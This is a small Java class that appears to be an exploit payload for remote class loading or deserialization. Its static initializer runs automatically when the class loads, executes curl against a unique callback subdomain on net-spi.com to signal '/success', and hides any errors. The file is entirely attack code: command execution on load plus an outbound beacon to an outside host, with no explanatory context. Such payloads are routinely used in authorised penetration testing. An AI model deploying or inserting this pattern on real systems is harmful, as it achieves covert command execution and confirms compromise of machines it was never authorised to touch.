// javac Command.java
import java.lang.Runtime;
import java.lang.Process;

public class Command {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"curl", "http://xnoe5gwh7gn3kvj0e1wiu1dff6lx9wxl.net-spi.com/success"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}
